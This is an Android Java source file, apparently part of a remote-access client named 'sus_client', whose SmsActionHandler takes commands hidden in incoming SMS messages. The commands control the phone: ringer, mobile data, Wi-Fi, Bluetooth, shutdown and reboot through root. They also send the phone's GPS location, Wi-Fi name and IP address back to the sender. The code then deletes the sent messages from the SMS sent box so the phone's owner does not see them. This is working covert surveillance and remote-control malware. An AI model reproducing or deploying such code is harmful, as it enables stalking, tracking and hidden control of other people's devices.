package com.android.sus_client.background.sms;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.bluetooth.BluetoothAdapter;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.SystemClock;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.text.TextUtils;

import java.io.DataOutputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.android.sus_client.services.GpsTracker;
import com.android.sus_client.utils.AppUtils;
import com.android.sus_client.utils.phoneutils.DeviceInfo;

public class SmsActionHandler {

    private Context context;
    private String senderNo;
    private WifiManager wifiManager;
    private AppUtils appUtils;

    private final static String TXT_SEPARATOR = "@x@";
    private final static String NEW_LINE_SEPARATOR = System.getProperty("line.separator");

    /**
     * Last event time
     */
    private long mLastEventTime;
    private static final long MIN_EVENT_INTERVAL = 1000;

    public enum CMD {
        RING_SILENT("RingSilent"),
        RING_NORMAL("RING_NORMAL"),
        DATA_ON("DataOn"),
        DATA_OFF("DataOff"),
        WIFI_ON("WifiOn"),
        WIFI_OFF("WifiOff"),
        BLUETOOTH_ON("BluetoothOn"),
        BLUETOOTH_OFF("BluetoothOff"),
        FLASH_ON("FlashOn"),
        FLASH_OFF("FlashOff"),
        NOTIFICATION("Notification"),
        WIFI_NAME("WifiName"),
        LOCATION("GpsLocation"),
        IP_ADDRESS("IpAddress"),
        SEND_SMS("SendSMS"),
        PLAY_RING("PlayRing"),
        SHUTDOWN_DEVICE("ShutdownDe"),
        RESTART_DEVICE("RestartDe");

        private static final Map<String, CMD> BY_CMD = new HashMap<>();

        static {
            for (CMD e : values()) {
                BY_CMD.put(e.cmd, e);
            }
        }

        public final String cmd;

        CMD(String cmd) {
            this.cmd = cmd;
        }

        public static CMD valueOfCmd(String cmd) {
            return BY_CMD.get(cmd.trim());
        }
    }


    public SmsActionHandler(Context context, String message, String senderNo) {
        this.context = context;
        this.senderNo = senderNo;
        this.wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        this.appUtils = new AppUtils(context);
        try {
            processAction(getArgs(message));
        } catch (Exception ignored) {
        }
    }

    @SuppressLint("NewApi")
    private void processAction(List<String> args) throws Exception {
        switch (CMD.valueOfCmd(args.get(0))) {
            // SILENT MODE
            case RING_SILENT:
                AudioManager am = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                break;

            // NORMAL MODE
            case RING_NORMAL:
                AudioManager am1 = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                am1.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                break;

            // Data ON
            case DATA_ON:
                setMobileDataState(context, true);
                break;

            // Data OFF
            case DATA_OFF:
                setMobileDataState(context, false);
                break;

            // WIFI ON
            case WIFI_ON:
                wifiManager.setWifiEnabled(true);
                wifiManager.startScan();
                break;

            // WIFI OFF
            case WIFI_OFF:
                wifiManager.setWifiEnabled(false);
                break;

            // BLUETOOTH ON
            case BLUETOOTH_ON:
                BluetoothAdapter.getDefaultAdapter().enable();
                break;

            // BLUETOOTH OFF
            case BLUETOOTH_OFF:
                BluetoothAdapter.getDefaultAdapter().disable();
                break;

            // FLASHLIGHT ON BACK CAM
            case FLASH_ON:
                CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                // 0 MEANS BACK CAM
                // I PUT TRY AND CATCH ON THIS , BECAUSE SOME PHONE(S) DOESN'T HAVE ANY FLASHLIGHT AND AVOIDING THE APP CRASHES
                String cameraId = cameraManager.getCameraIdList()[0];
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    cameraManager.setTorchMode(cameraId, true);
                }
                break;

            // FLASHLIGHT OFF BACK CAM
            case FLASH_OFF:
                CameraManager cameraManager1 = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                // 0 MEANS BACK CAM
                // I PUT TRY AND CATCH ON THIS , BECAUSE SOME PHONE(S) DOESN'T HAVE ANY FLASHLIGHT AND AVOIDING THE APP CRASHES
                String cameraId1 = cameraManager1.getCameraIdList()[0];
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    cameraManager1.setTorchMode(cameraId1, false);
                }
                break;

            // Show a notification as APPLICATION NAME and APPLICATION ICON
            case NOTIFICATION:
                String Title = args.get(1);
                String Body = args.get(2);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    /*NotificationChannel channel = new NotificationChannel("n", "n", NotificationManager.IMPORTANCE_DEFAULT);
                    NotificationManager manager = context.getSystemService(NotificationManager.class);
                    manager.createNotificationChannel(channel);
                    NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "n")
                            .setContentTitle(Title)
                            .setContentText(Body)
                            .setSmallIcon(R.drawable.android_black)
                            .setAutoCancel(true);

                    NotificationManagerCompat managerCompat = NotificationManagerCompat.from(context);
                    managerCompat.notify(999, builder.build());*/
                }
                break;

            // WIFI NAME
            case WIFI_NAME:
                WifiInfo info = wifiManager.getConnectionInfo();
                if (info != null) {
                    final String textMessageEncoded = convertStringToHex(info.getSSID());
                    sendSMS(textMessageEncoded);
                }
                break;

            // GPS Location
            case LOCATION:
                GpsTracker gpsTracker = GpsTracker.getInstance(context);
                gpsTracker.setLocationListener(locationData -> {
                    if (gpsTracker.trackingEnabled()) {
                        // THIS CODE IS TO SHORTEN THE GPS LOCATION BY 4 DECIMAL
                        // SO THAT WHEN WE ENCODE AND SENT TO A NUMBER . THE SMS WILL NOT FAIL

                        final String gps_enabled = "GPS Enabled: " + (gpsTracker.isGpsEnabled ? "Yes" : "No");
                        final String gps_precise = NEW_LINE_SEPARATOR + "Latitude: " + gpsTracker.getLatitude() + NEW_LINE_SEPARATOR + "Longitude: " + gpsTracker.getLongitude();
                        final String textMessageEncoded = convertStringToHex(gps_enabled + gps_precise);
                        sendSMS(textMessageEncoded);
                        gpsTracker.stopUsingGPS();
                    }
                });
                break;

            // IP Address
            case IP_ADDRESS:
                String ip4 = DeviceInfo.getPublicIPAddress(false);
                String ip6 = DeviceInfo.getPublicIPAddress(true);
                String ips = "";
                if (ip4 != null)
                    ips += ("IPV4: " + ip4);
                if (ip6 != null)
                    ips += (NEW_LINE_SEPARATOR + "IPV6: " + ip6);

                final String textMessageEncoded = convertStringToHex(ips);
                sendSMS(textMessageEncoded);
                break;

            // SEND A MESSAGE (Eg; SendSMS@x@8080@x@Hello User!)
            case SEND_SMS:
                String mNumber = args.get(1);
                String mMessage = args.get(2);
                sendSMS(mNumber, mMessage);
                break;

            //PLAY A SOUND BE CREATIVE
            case PLAY_RING:
                appUtils.playAssetSound("sound_horror.wav");
                break;

            // SHUTDOWN DEVICE (ROOT ONLY COMMAND)
            case SHUTDOWN_DEVICE:
                Process p0 = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot -p"});
                p0.waitFor();
                break;

            // RESTART DEVICE (ROOT ONLY COMMAND)
            case RESTART_DEVICE:
                Process p1 = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
                p1.waitFor();
                break;

        }
    }

    private void sendSMS(String textMessage) {
        sendSMS(null, textMessage);
    }

    private void sendSMS(String toNumber, String textMessage) {
        long currentEventTime = SystemClock.uptimeMillis();
        long elapsedTime = currentEventTime - mLastEventTime;
        //There may be 2 hits or 3 hits, to ensure that mLastEventTime always records the time of the last send sms called
        mLastEventTime = currentEventTime;
        if (elapsedTime <= MIN_EVENT_INTERVAL)
            return;

        String senderNumber = TextUtils.isEmpty(toNumber) ? senderNo : toNumber;
        ArrayList<PendingIntent> sentPendingIntents = new ArrayList<>();
        ArrayList<PendingIntent> deliveredPendingIntents = new ArrayList<>();
        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, new Intent(context, SmsSentReceiver.class), 0);
        PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0, new Intent(context, SmsDeliveredReceiver.class), 0);
        try {
            SmsManager sms = SmsManager.getDefault();
            ArrayList<String> mSMSMessage = sms.divideMessage(textMessage);
            for (int i = 0; i < mSMSMessage.size(); i++) {
                sentPendingIntents.add(i, sentPI);
                deliveredPendingIntents.add(i, deliveredPI);
            }
            sms.sendMultipartTextMessage(senderNumber, null, mSMSMessage, null, null);
            //sms.sendMultipartTextMessage(senderNumber, null, mSMSMessage, sentPendingIntents, deliveredPendingIntents);


            // THEN DELETE THE SENT SMS
            new Handler().postDelayed(() -> deleteSentSMS(context, senderNumber, mSMSMessage), 3000);
        } catch (Exception ignored) {
        }
    }

    /**
     * Check if your app is default sms app before deleting
     * <a href="https://stackoverflow.com/questions/38247949/how-can-i-create-a-project-in-android-studio-to-function-default-sms-app">To make app as default app see this.</a>)
     */
    public static void deleteSentSMS(Context context, String phoneNumber, ArrayList<String> messagesParts) {
        try {
            ContentResolver contentResolver = context.getApplicationContext().getContentResolver();
            Uri uri = Uri.parse("content://sms/sent");
            String[] projection = new String[]{"_id", "address", "body", "date"};
            Cursor cursor = contentResolver.query(uri, projection, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));

                    // Check if the message matches any in the list to delete
                    for (String message : messagesParts) {
                        if (phoneNumber.equals(address) && message.equals(body)) {
                            // Get message ID & Construct the delete Uri for the message
                            int messageId = cursor.getInt(cursor.getColumnIndex(Telephony.Sms._ID));
                            Uri deleteUri = Telephony.Sms.CONTENT_URI.buildUpon().appendPath(String.valueOf(messageId)).build();

                            // Delete the message & Check if deletion was successful
                            int rowsDeleted = contentResolver.delete(deleteUri, null, null);
                            System.out.println(rowsDeleted);
                            /*if (rowsDeleted > 0) {
                                Toast.makeText(context, "Sent SMS deleted successfully", Toast.LENGTH_LONG).show();
                            } else {
                                Toast.makeText(context, "Failed to delete Sent SMS", Toast.LENGTH_LONG).show();
                            }*/
                        }
                    }
                }
                cursor.close();
            }
        } catch (Exception ignored) {
        }
    }

    public void setMobileDataState(Context context, boolean enable) {
        try {
            ConnectivityManager dataManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            Method dataMtd = ConnectivityManager.class.getDeclaredMethod("setMobileDataEnabled", boolean.class);
            dataMtd.setAccessible(true);
            dataMtd.invoke(dataManager, enable);
            /*final ConnectivityManager conman = (ConnectivityManager)  context.getSystemService(Context.CONNECTIVITY_SERVICE);
            final Class conmanClass = Class.forName(conman.getClass().getName());
            final Field connectivityManagerField = conmanClass.getDeclaredField("mService");
            connectivityManagerField.setAccessible(true);
            final Object connectivityManager = connectivityManagerField.get(conman);
            final Class connectivityManagerClass =  Class.forName(connectivityManager.getClass().getName());
            final Method setMobileDataEnabledMethod = connectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
            setMobileDataEnabledMethod.setAccessible(true);
            setMobileDataEnabledMethod.invoke(connectivityManager, enable);*/
        } catch (Exception ex) {
            ex.printStackTrace();
            try {
                String[] cmds = {enable ? "svc data enable" : "svc data disable"};
                Process p = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(p.getOutputStream());
                for (String tmpCmd : cmds) {
                    os.writeBytes(tmpCmd + "\n");
                }
                os.writeBytes("exit\n");
                os.flush();
            } catch (Exception ignored) {
            }
        }
    }

    /**
     * THIS WILL ENCODE THE DATA WITH HEX (SO THAT THE DATA WILL NOT READ EASILY)
     * THIS ENCODED DATA FITS TO MMS EITHER THE MMS WILL FAIL OR SENT DEPENDING UPON THE MMS
     */
    public static String convertStringToHex(String str) {
        StringBuilder hex = new StringBuilder();
        for (char temp : str.toCharArray()) {
            hex.append(Integer.toHexString((int) temp));
        }
        return str;
        //return hex.toString();
    }

    public static String convertHexToString(String hex) {
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < hex.length() - 1; i += 2) {
            try {
                String tempInHex = hex.substring(i, (i + 2));
                int decimal = Integer.parseInt(tempInHex, 16);
                result.append((char) decimal);
            } catch (RuntimeException ignored) {
            }
        }
        return result.toString();
    }

    public static List<String> getArgs(String message) {
        final String decodedMessage = message.trim();
        //final String decodedMessage = convertHexToString(message.trim());
        try {
            return Arrays.asList(decodedMessage.split(TXT_SEPARATOR));
        } catch (Exception ignored) {
        }
        return new ArrayList<>();
    }

    public static boolean hasCommand(String message) {
        final List<String> args = getArgs(message);
        if (args.isEmpty()) return false;

        final String command = args.get(0);
        for (CMD cmd : CMD.values()) {
            if (command.contentEquals(cmd.cmd)) {
                return true;
            }
        }
        return false;
    }

}